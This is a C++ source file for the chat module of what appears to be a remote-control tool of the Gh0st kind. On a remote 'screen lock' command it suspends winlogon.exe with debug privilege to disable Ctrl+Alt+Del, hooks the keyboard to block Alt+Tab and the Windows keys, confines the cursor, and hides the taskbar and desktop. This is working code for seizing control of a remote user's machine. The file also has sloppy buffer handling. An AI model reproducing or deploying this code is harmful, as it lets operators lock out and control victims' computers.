#include "stdafx.h"
#include <stdio.h>
#include "tchar.h"
#include <Windows.h>
#include <TlHelp32.h>
#include <string>
#include "ChatManager.h"


struct PIDWNDINFO
{
	DWORD dwProcessId;
	HWND hWnd;
};

#define SE_DEBUG_PRIVILEGE 20
typedef LONG(__stdcall* RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
typedef LONG(__stdcall* SuspendOrResumeProcess)(HANDLE hProcess);

//注册全局hook
HANDLE hProcess;
SuspendOrResumeProcess lpfnNtResumeProcess;
HHOOK g_hKeyBoard = NULL;
int user = 0;
DWORD GetWinlogonPid() {
	HANDLE			snap;
	PROCESSENTRY32	pEntry = { sizeof(pEntry) };
	BOOL			rtn;
	snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	rtn = Process32First(snap, &pEntry);
	while (rtn) {
		if (!_tcscmp(pEntry.szExeFile, _T("winlogon.exe"))) {
			CloseHandle(snap);
			return pEntry.th32ProcessID;
		}
		memset(pEntry.szExeFile, 0, 260);
		rtn = Process32Next(snap, &pEntry);
	}

	CloseHandle(snap);
	return 0;
}




//底层键盘系统调用，过滤alt + tab和win键
LRESULT CALLBACK KeyBoardProc(int code, WPARAM wParam, LPARAM lParam)
{
	if (code == HC_ACTION)
	{
		PKBDLLHOOKSTRUCT p;

		switch (wParam)
		{
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
		case WM_KEYUP:
		case WM_SYSKEYUP:
			p = (PKBDLLHOOKSTRUCT)lParam;

			if ((p->vkCode == VK_TAB && (p->flags & LLKHF_ALTDOWN) != 0) //ALT+TAB
				|| (p->vkCode == VK_F4 && (p->flags & LLKHF_ALTDOWN) != 0) //ALT+F4
				|| (p->vkCode == VK_ESCAPE && (p->flags & LLKHF_ALTDOWN) != 0) //Alt+Esc
				|| (p->vkCode == VK_ESCAPE && (GetKeyState(VK_CONTROL) & 0x8000) != 0) //Ctrl+Esc
				|| (p->vkCode == VK_LWIN)
				|| (p->vkCode == VK_RWIN)
				)
			{
			
				return 1;
			}
			//if ((GetKeyState(VK_CAPITAL) & 1) != 0)
			//{
			//	//pDlg->m_sta_hint.SetWindowTextA("！！！【大写锁定】！！！");
			//}
			//else
			//{
			//	//	pDlg->m_sta_hint.SetWindowTextA("远程防误操作，输入密码亦可退出");
			//}

			break;
		}
	}

	return ::CallNextHookEx(g_hKeyBoard, code, wParam, lParam);
}

BOOL CALLBACK EnumWindowsProc(HWND hWnd, LPARAM lParam)
{
	PIDWNDINFO* pInfo = (PIDWNDINFO*)lParam;
	LONG lStyle = GetWindowLong(hWnd, GWL_STYLE);
	if (pInfo->dwProcessId == 0 && hWnd != pInfo->hWnd &&
		IsWindowVisible(hWnd) && GetParent(hWnd) == NULL && lStyle & WS_MINIMIZEBOX)
	{
		ShowWindow(hWnd, SW_MINIMIZE);
		return TRUE;
	}

	DWORD dwProcessId;
	GetWindowThreadProcessId(hWnd, &dwProcessId);
	if (dwProcessId == pInfo->dwProcessId && IsWindowVisible(hWnd) && GetParent(hWnd) == NULL)
	{
		pInfo->hWnd = hWnd;
		return FALSE;
	}
	return TRUE;
}


void SetHook()
{
	g_hKeyBoard = SetWindowsHookEx(WH_KEYBOARD_LL, KeyBoardProc, GetModuleHandle(NULL), 0);
	HMODULE hMod = LoadLibrary(_T("ntdll"));

	RtlAdjustPrivilege lpfnRtlAdjustPrivilege = (RtlAdjustPrivilege)GetProcAddress(hMod, "RtlAdjustPrivilege");


	SuspendOrResumeProcess lpfnNtSuspendProcess = (SuspendOrResumeProcess)GetProcAddress(hMod, "NtSuspendProcess");


	lpfnNtResumeProcess = (SuspendOrResumeProcess)GetProcAddress(hMod, "NtResumeProcess");


	DWORD pid = GetWinlogonPid();


	BOOLEAN dummy = 0;
	lpfnRtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, true, false, &dummy);

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);

	lpfnNtSuspendProcess(hProcess);
	//MessageBox(NULL, "Now Ctrl+Alt+Del is disabled! Press OK to restore.", "Ha!", MB_OK | MB_ICONINFORMATION);

}
//注销全局hook
void UnSetHook()
{
	if (g_hKeyBoard)
	{
		UnhookWindowsHookEx(g_hKeyBoard);
		lpfnNtResumeProcess(hProcess);
		g_hKeyBoard = NULL;
	}

}





CChatManager::CChatManager(ISocketBase* pClient) :CManager(pClient)
{
	m_buser = FALSE;
	m_hWnd = NULL;
	BYTE	bToken;
	bToken = TOKEN_CHAT_START;
	Send((LPBYTE)&bToken, sizeof(bToken));
	WaitForDialogOpen();
	HANDLE hThread = CreateThread(NULL, 0, MessageLoopProc, this, 0, NULL);
	if (hThread) CloseHandle(hThread);
	m_buser = TRUE;
}

CChatManager::~CChatManager()
{
	if (!m_buser) return;
	if (user == 1)
	{
		UnSetHook();
		ClipCursor(NULL);
		SystemParametersInfo(SPI_SETSCREENSAVERRUNNING, false, 0, SPIF_UPDATEINIFILE);
		::ShowWindow(::FindWindow(_T("Shell_TrayWnd"), NULL), SW_SHOW);
		::ShowWindow(::FindWindow(_T("Button"), _T("开始")), SW_SHOW);
		::ShowWindow(::FindWindow(_T("Progman"), NULL), SW_SHOW);
		user = 0;
	}
	if (m_hWnd)
	{
		SendMessage(m_hWnd, WM_USER + 1, NULL, NULL);
	}
}

DWORD WINAPI CChatManager::MessageLoopProc(LPVOID lParam)
{
	HGLOBAL hGlobal;
	LPBYTE lpBuffer;
	LPDLGTEMPLATE lpTemplate;
	LPWORD lpWord;
	LPWSTR lpCaption;
	LPWSTR lpFontName;
	LPDLGITEMTEMPLATE lpItemTemplate;

	hGlobal = GlobalAlloc(GMEM_ZEROINIT, 256);
	if (hGlobal == NULL)
		return -1;
	lpBuffer = (LPBYTE)GlobalLock(hGlobal);
	if (lpBuffer == NULL)
	{
		GlobalFree(hGlobal);
		return -1;
	}

	// Define a dialog box
	lpTemplate = (LPDLGTEMPLATE)lpBuffer;
	lpTemplate->style = DS_SETFONT | DS_MODALFRAME | DS_CENTER | WS_MINIMIZEBOX | WS_POPUP | WS_CAPTION | WS_SYSMENU;
	lpTemplate->cdit = 4;
	lpTemplate->x = 0;
	lpTemplate->y = 0;
	lpTemplate->cx = 235;
	lpTemplate->cy = 155;
	lpWord = (LPWORD)(lpTemplate + 1);
	*lpWord++ = 0;      // no menu
	*lpWord++ = 0;      // predefined dialog box class (by default)
	lpCaption = L"";
	_tcscpy_s((wchar_t*)lpWord, (wcslen(lpCaption) + 1), lpCaption);
	lpWord = (LPWORD)((LPBYTE)lpWord + (wcslen(lpCaption) + 1) * sizeof(WCHAR));
	*lpWord++ = 10;     // font size
	lpFontName = L"宋体";
	_tcscpy_s((wchar_t*)lpWord, (wcslen(lpFontName) + 1), lpFontName);
	lpWord = (LPWORD)((LPBYTE)lpWord + (wcslen(lpFontName) + 1) * sizeof(WCHAR));

	// Define a new message edit
	lpItemTemplate = (LPDLGITEMTEMPLATE)(((DWORD_PTR)lpWord + 3) & ~3);
	lpItemTemplate->style = ES_MULTILINE | ES_AUTOVSCROLL | WS_VSCROLL | WS_BORDER | WS_TABSTOP | WS_VISIBLE;
	lpItemTemplate->x = 3;
	lpItemTemplate->y = 113;
	lpItemTemplate->cx = 170;
	lpItemTemplate->cy = 38;
	lpItemTemplate->id = IDC_EDIT_NEWMSG;
	lpWord = (LPWORD)(lpItemTemplate + 1);
	*lpWord++ = 0xFFFF; // indicating atom value
	*lpWord++ = 0x0081; // edit class atom
	lpCaption = L"";
	_tcscpy_s((wchar_t*)lpWord, (wcslen(lpCaption) + 1), lpCaption);
	lpWord = (LPWORD)((LPBYTE)lpWord + (wcslen(lpCaption) + 1) * sizeof(WCHAR));
	*lpWord++ = 0;      // no creation data

	// Define a send message button
	lpItemTemplate = (LPDLGITEMTEMPLATE)(((DWORD_PTR)lpWord + 3) & ~3);
	lpItemTemplate->style = BS_DEFPUSHBUTTON | WS_TABSTOP | WS_VISIBLE;
	lpItemTemplate->x = 178;
	lpItemTemplate->y = 116;
	lpItemTemplate->cx = 54;
	lpItemTemplate->cy = 14;
	lpItemTemplate->id = IDC_BUTTON_SEND;
	lpWord = (LPWORD)(lpItemTemplate + 1);
	*lpWord++ = 0xFFFF; // indicating atom value
	*lpWord++ = 0x0080; // button class atom
	lpCaption = L"发送消息";
	_tcscpy_s((wchar_t*)lpWord, (wcslen(lpCaption) + 1), lpCaption);
	lpWord = (LPWORD)((LPBYTE)lpWord + (wcslen(lpCaption) + 1) * sizeof(WCHAR));
	*lpWord++ = 0;      // no creation data

	// Define an end chat button
	lpItemTemplate = (LPDLGITEMTEMPLATE)(((DWORD_PTR)lpWord + 3) & ~3);
	lpItemTemplate->style = WS_DISABLED | WS_TABSTOP | WS_VISIBLE;
	lpItemTemplate->x = 178;
	lpItemTemplate->y = 133;
	lpItemTemplate->cx = 54;
	lpItemTemplate->cy = 14;
	lpItemTemplate->id = IDC_BUTTON_END;
	lpWord = (LPWORD)(lpItemTemplate + 1);
	*lpWord++ = 0xFFFF; // indicating atom value
	*lpWord++ = 0x0080; // button class atom
	lpCaption = L"结束交谈";
	_tcscpy_s((wchar_t*)lpWord, (wcslen(lpCaption) + 1), lpCaption);
	lpWord = (LPWORD)((LPBYTE)lpWord + (wcslen(lpCaption) + 1) * sizeof(WCHAR));
	*lpWord++ = 0;      // no creation data

	// Define a chat log edit
	lpItemTemplate = (LPDLGITEMTEMPLATE)(((DWORD_PTR)lpWord + 3) & ~3);
	lpItemTemplate->style = ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY | WS_VSCROLL | WS_BORDER | WS_TABSTOP | WS_VISIBLE;
	lpItemTemplate->x = 3;
	lpItemTemplate->y = 3;
	lpItemTemplate->cx = 229;
	lpItemTemplate->cy = 107;
	lpItemTemplate->id = IDC_EDIT_CHATLOG;
	lpWord = (LPWORD)(lpItemTemplate + 1);
	*lpWord++ = 0xFFFF; // indicating atom value
	*lpWord++ = 0x0081; // edit class atom
	lpCaption = L"";
	_tcscpy_s((wchar_t*)lpWord, (wcslen(lpCaption) + 1), lpCaption);
	lpWord = (LPWORD)((LPBYTE)lpWord + (wcslen(lpCaption) + 1) * sizeof(WCHAR));
	*lpWord++ = 0;      // no creation data

	CChatManager* pThis = (CChatManager*)lParam;
	pThis->m_hWnd = CreateDialogIndirectParam(NULL, lpTemplate, NULL, ChatDialogProc, (LPARAM)pThis);
	GlobalUnlock(hGlobal);
	GlobalFree(hGlobal);
	if (pThis->m_hWnd)
	{
		SendMessage(GetDlgItem(pThis->m_hWnd, IDC_EDIT_NEWMSG), EM_SETLIMITTEXT, 8158, 0);
		SetWindowPos(pThis->m_hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE);
		//ShowWindow(pThis->m_hWnd,SW_SHOW);
		LONG lStyle = GetWindowLong(pThis->m_hWnd, GWL_STYLE);
		lStyle &= ~(WS_MINIMIZEBOX | WS_MAXIMIZEBOX);
		SetWindowLong(pThis->m_hWnd, GWL_STYLE, lStyle);
		MSG msg;
		while (GetMessage(&msg, NULL, 0, 0))
		{
			if (!IsDialogMessage(pThis->m_hWnd, &msg))
			{
				TranslateMessage(&msg);
				DispatchMessage(&msg);
			}
		}
	}
	return 0;
}

INT_PTR CALLBACK CChatManager::ChatDialogProc(HWND hDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	CChatManager* pThis = (CChatManager*)GetWindowLongPtr(hDlg, GWLP_USERDATA);
	switch (uMsg)
	{
	case WM_INITDIALOG:
		SetWindowLongPtr(hDlg, GWLP_USERDATA, (LONG_PTR)lParam);
#ifdef _WIN64
		SetClassLong(hDlg, -12, (LONG)LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_CHAT)));
#else
		SetClassLong(hDlg, GCL_HICON, (LONG)LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_CHAT)));
#endif

		return TRUE;
	case WM_COMMAND:
		if (LOWORD(wParam) == IDC_BUTTON_SEND)
		{
			TCHAR* str =new TCHAR [8159];
			GetDlgItemText(hDlg, IDC_EDIT_NEWMSG, str, sizeof(str) * sizeof(TCHAR));
			if (_tcscmp(str, _T("")) == 0)
			{
				SetFocus(GetDlgItem(hDlg, IDC_EDIT_NEWMSG));
				return TRUE; // 发送消息为空不处理
			}
			pThis->Send((LPBYTE)str, lstrlen(str) * sizeof(TCHAR) + sizeof(TCHAR));
			SYSTEMTIME st;
			GetLocalTime(&st);
			TCHAR* Text = new TCHAR[8192];
			ZeroMemory(Text, 8192 * 2);
			swprintf_s(Text, 8192, _T("%s %d/%d/%d %d:%02d:%02d\r\n  %s\r\n\r\n"), _T("自己:"),
				st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, str);
			HWND hEditChatLog = GetDlgItem(hDlg, IDC_EDIT_CHATLOG);
			int nEditChatLogLen = GetWindowTextLength(hEditChatLog);
			if (nEditChatLogLen >= 20000)
			{
				SetWindowText(hEditChatLog, _T(""));
				nEditChatLogLen = GetWindowTextLength(hEditChatLog);
			}
			SendMessage(hEditChatLog, EM_SETSEL, nEditChatLogLen, nEditChatLogLen);
			SendMessage(hEditChatLog, EM_REPLACESEL, FALSE, (LPARAM)Text);
			//SendMessage(edit,WM_VSCROLL,MAKEWPARAM(SB_BOTTOM,0),0);
			SetDlgItemText(hDlg, IDC_EDIT_NEWMSG, _T(""));
			SetFocus(GetDlgItem(hDlg, IDC_EDIT_NEWMSG));
			return TRUE;
		}
		break;
	case WM_CLOSE:
		return 0;
	case WM_USER + 1:
		DestroyWindow(hDlg);
		return TRUE;
	case WM_USER +2:
		SetHook();
		return TRUE;

	case WM_DESTROY:
		PostQuitMessage(0);
		return TRUE;


	default:
		break;
	}
	return FALSE;
}

void CChatManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (lpBuffer[0] == TOKEN_HEARTBEAT) return;
	if (nSize == 1)
	{
		switch (lpBuffer[0])
		{
		case COMMAND_NEXT_CChat:
		{
			NotifyDialogIsOpen();
			return;
		}
		break;
		case COMMAND_CHAT_CLOSE:
		{
			SendMessage(m_hWnd, WM_USER + 1, NULL, NULL);
			return;
		}
		break;
		case COMMAND_CHAT_SCREEN_LOCK:
		{
			SetEvent(m_hEventDlgOpen);
			ShowWindow(m_hWnd, SW_RESTORE);
			RECT rct;
			PIDWNDINFO pwi;
			GetWindowRect(m_hWnd, &rct);
			ClipCursor(&rct);
			SystemParametersInfo(SPI_SETSCREENSAVERRUNNING, true, 0, SPIF_UPDATEINIFILE);
			pwi.dwProcessId = 0;
			pwi.hWnd = m_hWnd;
			EnumWindows(EnumWindowsProc, (LPARAM)&pwi);
			::ShowWindow(::FindWindow(_T("Shell_TrayWnd"), NULL), SW_HIDE);
			::ShowWindow(::FindWindow(_T("Button"), _T("开始")), SW_HIDE);
			::ShowWindow(::FindWindow(_T("Progman"), NULL), SW_HIDE);
			SendMessage(m_hWnd, WM_USER + 2, NULL, NULL);
			//SetHook();
			user = 1;
			return;
		}
		break;
		case COMMAND_CHAT_SCREEN_UNLOCK:
		{
			if (user == 1)
			{
				UnSetHook();
				ClipCursor(NULL);
				SystemParametersInfo(SPI_SETSCREENSAVERRUNNING, false, 0, SPIF_UPDATEINIFILE);
				::ShowWindow(::FindWindow(_T("Shell_TrayWnd"), NULL), SW_SHOW);
				::ShowWindow(::FindWindow(_T("Button"), _T("开始")), SW_SHOW);
				::ShowWindow(::FindWindow(_T("Progman"), NULL), SW_SHOW);
				user = 0;
				return;
			}
		}
		break;
		default:
			break;
		}
	}






	SYSTEMTIME st;
	GetLocalTime(&st);
	TCHAR* Text=new TCHAR[8192] ;
	ZeroMemory(Text, 8192 * 2);
	swprintf_s(Text,8192, _T("%s %d/%d/%d %d:%02d:%02d\r\n  %s\r\n\r\n"), _T("对方:"),
		st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, lpBuffer);
	HWND hEditChatLog = GetDlgItem(m_hWnd, IDC_EDIT_CHATLOG);
	int nEditChatLogLen = GetWindowTextLength(hEditChatLog);
	if (nEditChatLogLen >= 20000)
	{
		SetWindowText(hEditChatLog, _T(""));
		nEditChatLogLen = GetWindowTextLength(hEditChatLog);
	}
	SendMessage(hEditChatLog, EM_SETSEL, nEditChatLogLen, nEditChatLogLen);
	SendMessage(hEditChatLog, EM_REPLACESEL, FALSE, (LPARAM)Text);
	//SendMessage(edit,WM_VSCROLL,MAKEWPARAM(SB_BOTTOM,0),0);
	ShowWindow(m_hWnd, SW_RESTORE);
	SAFE_DELETE_AR(Text);
}
